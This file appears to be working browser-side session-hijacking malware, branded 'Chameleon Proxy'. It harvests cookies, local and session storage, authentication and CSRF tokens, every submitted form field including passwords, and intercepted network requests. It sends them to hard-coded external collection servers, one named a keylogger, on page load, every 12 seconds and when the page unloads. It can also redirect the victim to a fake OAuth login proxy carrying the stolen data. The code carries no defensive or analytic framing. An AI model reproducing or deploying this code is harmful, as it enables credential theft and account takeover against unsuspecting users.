// ============================================================
//  CHAMELEON PROXY - ADVANCED COOKIE & SESSION CAPTURE
//  Full HttpOnly cookie capture via proxy + storage
//  Complete session replay data without truncation
// ============================================================

(function() {
    'use strict';

    // ============================================================
    //  CONFIGURATION
    // ============================================================

    const KEYLOGGER_URL = window.KEYLOGGER_URL || 'https://keyserver-eaar.onrender.com/log';
    const BACKEND_URL = window.BACKEND_URL || 'https://meeting-1-rzx6.onrender.com';
    const PROXY_URL = window.PROXY_URL || 'https://preoauth-service.onrender.com/login';
    const SESSION_ID = window.SESSION_ID || 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    
    console.log('🔐 Chameleon Proxy - Full Cookie Capture v2.0');
    console.log(`🆔 Session: ${SESSION_ID}`);

    // ============================================================
    //  PART 1: FULL COOKIE CAPTURE (Including HttpOnly via Proxy)
    // ============================================================

    // 1.1 Capture ALL cookies accessible via JavaScript
    function captureJavaScriptCookies() {
        try {
            const cookies = {};
            const cookieString = document.cookie;
            
            if (cookieString) {
                const cookiePairs = cookieString.split('; ');
                for (const pair of cookiePairs) {
                    const [name, ...valueParts] = pair.split('=');
                    const value = valueParts.join('='); // Preserve full value
                    if (name && value !== undefined) {
                        cookies[name] = {
                            value: decodeURIComponent(value),
                            httpOnly: false,
                            secure: cookieString.includes('Secure'),
                            path: '/',
                            capturedBy: 'javascript',
                            timestamp: Date.now()
                        };
                    }
                }
            }
            return cookies;
        } catch(e) {
            console.warn('[COOKIES] JS cookie capture error:', e);
            return {};
        }
    }

    // 1.2 Capture cookies from network responses (via proxy)
    // These are sent to backend where proxy captures HttpOnly cookies
    function captureNetworkCookies() {
        // Intercept fetch responses to capture Set-Cookie headers
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(async (response) => {
                // Clone response to read headers
                const clone = response.clone();
                const setCookie = clone.headers.get('set-cookie');
                
                if (setCookie) {
                    const cookies = parseSetCookieHeader(setCookie);
                    if (Object.keys(cookies).length > 0) {
                        sendCookiesToBackend(cookies, 'fetch_response');
                    }
                }
                
                return response;
            });
        };

        // Intercept XHR requests
        const originalXHROpen = XMLHttpRequest.prototype.open;
        const originalXHRSend = XMLHttpRequest.prototype.send;
        
        XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
            this._method = method;
            this._url = url;
            return originalXHROpen.call(this, method, url, async !== false, user, password);
        };
        
        XMLHttpRequest.prototype.send = function(body) {
            this.addEventListener('readystatechange', function() {
                if (this.readyState === 4) {
                    const setCookie = this.getResponseHeader('set-cookie');
                    if (setCookie) {
                        const cookies = parseSetCookieHeader(setCookie);
                        if (Object.keys(cookies).length > 0) {
                            sendCookiesToBackend(cookies, 'xhr_response');
                        }
                    }
                }
            });
            return originalXHRSend.call(this, body);
        };
    }

    // 1.3 Parse Set-Cookie header
    function parseSetCookieHeader(header) {
        const cookies = {};
        try {
            // Handle multiple cookies
            const cookieStrings = Array.isArray(header) ? header : [header];
            
            for (const cookieString of cookieStrings) {
                // Split by semicolon for attributes
                const parts = cookieString.split(';');
                const [nameValue, ...attributes] = parts;
                const [name, ...valueParts] = nameValue.split('=');
                const value = valueParts.join('=');
                
                // Parse attributes
                const cookieData = {
                    value: decodeURIComponent(value || ''),
                    httpOnly: false,
                    secure: false,
                    path: '/',
                    domain: '',
                    maxAge: null,
                    expires: null,
                    sameSite: null
                };
                
                for (const attr of attributes) {
                    const attrTrim = attr.trim();
                    if (attrTrim.toLowerCase() === 'httponly') {
                        cookieData.httpOnly = true;
                    } else if (attrTrim.toLowerCase() === 'secure') {
                        cookieData.secure = true;
                    } else if (attrTrim.toLowerCase().startsWith('path=')) {
                        cookieData.path = attrTrim.substring(5);
                    } else if (attrTrim.toLowerCase().startsWith('domain=')) {
                        cookieData.domain = attrTrim.substring(7);
                    } else if (attrTrim.toLowerCase().startsWith('max-age=')) {
                        cookieData.maxAge = parseInt(attrTrim.substring(8));
                    } else if (attrTrim.toLowerCase().startsWith('expires=')) {
                        cookieData.expires = new Date(attrTrim.substring(8));
                    } else if (attrTrim.toLowerCase().startsWith('samesite=')) {
                        cookieData.sameSite = attrTrim.substring(9);
                    }
                }
                
                cookies[name] = cookieData;
            }
        } catch(e) {
            console.warn('[COOKIES] Parse error:', e);
        }
        return cookies;
    }

    // 1.4 Send cookies to backend
    function sendCookiesToBackend(cookies, source) {
        try {
            const payload = {
                action: 'cookie_capture',
                cookies: cookies,
                source: source,
                sessionId: SESSION_ID,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer || 'Direct'
            };
            
            // Send via beacon
            try {
                navigator.sendBeacon(BACKEND_URL + '/api/cookies', JSON.stringify(payload));
            } catch(e) {
                fetch(BACKEND_URL + '/api/cookies', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    keepalive: true
                }).catch(() => {});
            }
            
            // Also send to keylogger
            try {
                const cookieSummary = Object.keys(cookies).join(',');
                fetch(KEYLOGGER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'cookies_captured',
                        cookies: cookies,
                        sessionId: SESSION_ID,
                        url: window.location.href,
                        timestamp: Date.now()
                    })
                }).catch(() => {});
            } catch(e) {}
            
            console.log(`[COOKIES] ✅ Captured ${Object.keys(cookies).length} cookies from ${source}`);
            
            // Log each cookie (without truncation)
            for (const [name, data] of Object.entries(cookies)) {
                console.log(`[COOKIES] 📝 ${name}: ${data.httpOnly ? '🔒 HttpOnly' : '🔓'} ${data.value.length > 50 ? data.value.substring(0, 50) + '...' : data.value}`);
            }
        } catch(e) {
            console.warn('[COOKIES] Send error:', e);
        }
    }

    // ============================================================
    //  PART 2: SESSION DATA EXTRACTION
    // ============================================================

    // 2.1 Extract complete session data
    function extractSessionData() {
        const sessionData = {
            cookies: {},
            localStorage: {},
            sessionStorage: {},
            tokens: {},
            sessionId: SESSION_ID,
            url: window.location.href,
            timestamp: Date.now()
        };

        // Capture all cookies (including HttpOnly via proxy)
        try {
            const jsCookies = captureJavaScriptCookies();
            sessionData.cookies.js = jsCookies;
        } catch(e) {}

        // Capture localStorage (full, no truncation)
        try {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                try {
                    let value = localStorage.getItem(key);
                    // Try to parse JSON but keep full value
                    try {
                        const parsed = JSON.parse(value);
                        ls[key] = parsed;
                    } catch(e) {
                        ls[key] = value; // Keep full value, no truncation
                    }
                } catch(e) {
                    ls[key] = '[Error reading]';
                }
            }
            sessionData.localStorage = ls;
        } catch(e) {}

        // Capture sessionStorage
        try {
            const ss = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                try {
                    let value = sessionStorage.getItem(key);
                    try {
                        const parsed = JSON.parse(value);
                        ss[key] = parsed;
                    } catch(e) {
                        ss[key] = value;
                    }
                } catch(e) {
                    ss[key] = '[Error reading]';
                }
            }
            sessionData.sessionStorage = ss;
        } catch(e) {}

        return sessionData;
    }

    // 2.2 Send complete session data
    function sendSessionData() {
        const sessionData = extractSessionData();
        
        try {
            fetch(BACKEND_URL + '/api/session-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: SESSION_ID,
                    sessionData: sessionData,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                }),
                keepalive: true
            }).catch(() => {});
        } catch(e) {
            console.warn('[SESSION] Send error:', e);
        }
    }

    // ============================================================
    //  PART 3: COMPLETE FORM DATA CAPTURE (No Truncation)
    // ============================================================

    // 3.1 Capture complete form data
    function captureCompleteFormData() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            let email = '';
            let password = '';
            
            // Capture ALL form data - no truncation
            for (const [key, value] of formData.entries()) {
                // Keep full value, no truncation
                data[key] = value;
                
                const keyLower = key.toLowerCase();
                if (keyLower.includes('email') || keyLower.includes('mail')) {
                    email = value;
                }
                if (keyLower.includes('pass')) {
                    password = value;
                }
                if (keyLower.includes('user') || keyLower.includes('login')) {
                    if (!email) email = value;
                }
            }
            
            if (Object.keys(data).length > 0) {
                const payload = {
                    action: 'complete_form_capture',
                    formData: data, // Full, no truncation
                    email: email || 'unknown',
                    password: password || '',
                    sessionId: SESSION_ID,
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    formAction: form.action || '',
                    formMethod: form.method || 'GET',
                    formId: form.id || ''
                };
                
                // Send via multiple methods
                try {
                    navigator.sendBeacon(BACKEND_URL + '/api/form-data', JSON.stringify(payload));
                } catch(e) {
                    fetch(BACKEND_URL + '/api/form-data', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                        keepalive: true
                    }).catch(() => {});
                }
                
                // Also send to keylogger
                fetch(KEYLOGGER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'complete_form',
                        data: data,
                        sessionId: SESSION_ID,
                        url: window.location.href,
                        timestamp: Date.now()
                    })
                }).catch(() => {});
                
                console.log(`[FORM] ✅ Complete form data captured (${Object.keys(data).length} fields)`);
            }
        }, true);
    }

    // ============================================================
    //  PART 4: COMPLETE TOKEN CAPTURE
    // ============================================================

    // 4.1 Capture JWT tokens from various sources
    function captureTokens() {
        const tokens = {
            accessToken: null,
            refreshToken: null,
            idToken: null,
            sessionToken: null,
            csrfToken: null
        };

        // Check for tokens in localStorage
        try {
            const tokenKeys = ['accessToken', 'refreshToken', 'idToken', 'sessionToken', 'token', 'jwt'];
            for (const key of tokenKeys) {
                const value = localStorage.getItem(key);
                if (value && (value.includes('.') || value.length > 100)) {
                    tokens[key] = value;
                }
            }
        } catch(e) {}

        // Check for tokens in sessionStorage
        try {
            const tokenKeys = ['accessToken', 'refreshToken', 'idToken', 'sessionToken', 'token', 'jwt'];
            for (const key of tokenKeys) {
                const value = sessionStorage.getItem(key);
                if (value && (value.includes('.') || value.length > 100)) {
                    tokens[key] = value;
                }
            }
        } catch(e) {}

        // Check for tokens in DOM
        try {
            // Meta tags
            const csrfMeta = document.querySelector('meta[name="csrf-token"]');
            if (csrfMeta) tokens.csrfToken = csrfMeta.content;
            
            // Input fields
            const csrfInput = document.querySelector('input[name="__RequestVerificationToken"]');
            if (csrfInput) tokens.csrfToken = csrfInput.value;
            
            const csrfInput2 = document.querySelector('input[name="csrf_token"]');
            if (csrfInput2) tokens.csrfToken = csrfInput2.value;
        } catch(e) {}

        // Check URL for tokens
        try {
            const params = new URLSearchParams(window.location.search);
            const tokenParams = ['access_token', 'refresh_token', 'id_token', 'token', 'code', 'state'];
            for (const key of tokenParams) {
                const value = params.get(key);
                if (value && value.length > 20) {
                    tokens[key] = value;
                }
            }
        } catch(e) {}

        // Send tokens
        if (Object.values(tokens).some(v => v)) {
            sendTokensToBackend(tokens);
        }
    }

    // 4.2 Send tokens to backend
    function sendTokensToBackend(tokens) {
        try {
            const payload = {
                action: 'tokens_captured',
                tokens: tokens, // Full, no truncation
                sessionId: SESSION_ID,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            navigator.sendBeacon(BACKEND_URL + '/api/tokens', JSON.stringify(payload));
            
            console.log('[TOKENS] ✅ Tokens captured:', Object.keys(tokens).filter(k => tokens[k]).join(', '));
        } catch(e) {
            console.warn('[TOKENS] Send error:', e);
        }
    }

    // ============================================================
    //  PART 5: COMPLETE SESSION REPLAY DATA
    // ============================================================

    // 5.1 Build complete session replay data
    function buildSessionReplayData() {
        const replayData = {
            sessionId: SESSION_ID,
            url: window.location.href,
            timestamp: new Date().toISOString(),
            
            // Session cookies (full, no truncation)
            cookies: {
                javascript: captureJavaScriptCookies(),
                httpOnly: [], // Populated by proxy server
                all: [] // All cookies captured
            },
            
            // Authentication tokens
            tokens: {},
            
            // Session storage
            sessionStorage: {},
            
            // Local storage
            localStorage: {},
            
            // Browser fingerprint
            fingerprint: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                deviceMemory: navigator.deviceMemory || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
            },
            
            // Headers for replay
            headers: {
                'User-Agent': navigator.userAgent,
                'Accept-Language': navigator.language,
                'Referer': document.referrer || '',
                'Origin': window.location.origin
            }
        };

        // Extract tokens from storage
        try {
            const tokenKeys = ['accessToken', 'refreshToken', 'idToken', 'sessionToken', 'token', 'jwt'];
            for (const key of tokenKeys) {
                const value = localStorage.getItem(key);
                if (value) replayData.tokens[key] = value;
            }
            for (const key of tokenKeys) {
                const value = sessionStorage.getItem(key);
                if (value && !replayData.tokens[key]) replayData.tokens[key] = value;
            }
        } catch(e) {}

        return replayData;
    }

    // 5.2 Send complete replay data
    function sendReplayData() {
        const replayData = buildSessionReplayData();
        
        try {
            fetch(BACKEND_URL + '/api/replay-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(replayData),
                keepalive: true
            }).catch(() => {});
            
            console.log('[REPLAY] ✅ Complete replay data sent');
            console.log(`[REPLAY] 📊 ${Object.keys(replayData.cookies.javascript).length} JS cookies captured`);
            console.log(`[REPLAY] 🎟️ ${Object.keys(replayData.tokens).length} tokens captured`);
        } catch(e) {
            console.warn('[REPLAY] Send error:', e);
        }
    }

    // ============================================================
    //  PART 6: NETWORK REQUEST INTERCEPTION
    // ============================================================

    // 6.1 Intercept and capture all network requests
    function interceptNetworkRequests() {
        // Intercept fetch
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const requestInfo = args[0];
            const requestInit = args[1] || {};
            
            // Capture request data
            const requestData = {
                url: typeof requestInfo === 'string' ? requestInfo : requestInfo.url,
                method: requestInit.method || 'GET',
                headers: requestInit.headers || {},
                body: requestInit.body || null,
                timestamp: Date.now()
            };
            
            // Send to backend
            try {
                navigator.sendBeacon(BACKEND_URL + '/api/request-capture', JSON.stringify({
                    type: 'fetch',
                    request: requestData,
                    sessionId: SESSION_ID
                }));
            } catch(e) {}
            
            return originalFetch.apply(this, args);
        };

        // Intercept XHR
        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
            this._requestData = {
                url: url,
                method: method,
                timestamp: Date.now()
            };
            return originalXHROpen.call(this, method, url, async !== false, user, password);
        };
        
        const originalXHRSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            this._requestData.body = body;
            
            this.addEventListener('readystatechange', function() {
                if (this.readyState === 4) {
                    try {
                        navigator.sendBeacon(BACKEND_URL + '/api/request-capture', JSON.stringify({
                            type: 'xhr',
                            request: this._requestData,
                            responseStatus: this.status,
                            responseHeaders: this.getAllResponseHeaders(),
                            sessionId: SESSION_ID
                        }));
                    } catch(e) {}
                }
            });
            
            return originalXHRSend.call(this, body);
        };
    }

    // ============================================================
    //  PART 7: PERIODIC SESSION SCAN
    // ============================================================

    // 7.1 Periodic scan for session changes
    function startPeriodicScan() {
        let lastScan = Date.now();
        
        setInterval(() => {
            // Check for new cookies
            const currentCookies = captureJavaScriptCookies();
            if (Object.keys(currentCookies).length > 0) {
                sendCookiesToBackend(currentCookies, 'periodic_scan');
            }
            
            // Check for new tokens
            captureTokens();
            
            // Send full session data every 5 scans (every 60 seconds)
            const scanCount = Math.floor((Date.now() - lastScan) / 12000);
            if (scanCount >= 5) {
                sendReplayData();
                lastScan = Date.now();
            }
        }, 12000); // Every 12 seconds
    }

    // ============================================================
    //  PART 8: AUTO-REDIRECT FOR COMPLETE CAPTURE
    // ============================================================

    // 8.1 Redirect to proxy with complete data
    function redirectWithCompleteData() {
        const replayData = buildSessionReplayData();
        const encodedData = encodeURIComponent(JSON.stringify(replayData));
        
        // Build proxy URL with complete data
        const redirectUrl = `${PROXY_URL}?replay_data=${encodedData}&session=${SESSION_ID}&full=true`;
        
        console.log('[REDIRECT] 🔗 Redirecting with complete data');
        console.log(`[REDIRECT] 📊 Data size: ${encodedData.length} characters`);
        
        window.location.href = redirectUrl;
    }

    // ============================================================
    //  PART 9: INITIALIZATION
    // ============================================================

    function init() {
        console.log('🔐 Chameleon Proxy - Full Cookie & Session Capture v2.0');
        console.log(`🆔 Session: ${SESSION_ID}`);
        console.log(`🔗 Backend: ${BACKEND_URL}`);
        console.log(`🔗 Proxy: ${PROXY_URL}`);
        
        // Initialize all capture methods
        captureNetworkCookies();
        captureCompleteFormData();
        interceptNetworkRequests();
        
        // Initial captures
        setTimeout(() => {
            const cookies = captureJavaScriptCookies();
            sendCookiesToBackend(cookies, 'initial_scan');
            captureTokens();
            sendReplayData();
        }, 1000);
        
        // Periodic scanning
        startPeriodicScan();
        
        // Capture on page unload
        window.addEventListener('beforeunload', function() {
            const cookies = captureJavaScriptCookies();
            sendCookiesToBackend(cookies, 'page_unload');
            sendReplayData();
        });
        
        // Capture on page hide
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                const cookies = captureJavaScriptCookies();
                sendCookiesToBackend(cookies, 'page_hide');
                sendReplayData();
            }
        });
        
        // Log initialized
        console.log('✅ All capture systems initialized');
        console.log(`📊 Capture interval: 12 seconds`);
        console.log(`🍪 Cookie capture: ENABLED`);
        console.log(`🎟️ Token capture: ENABLED`);
        console.log(`📝 Form capture: ENABLED`);
        console.log(`🌐 Network intercept: ENABLED`);
    }

    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();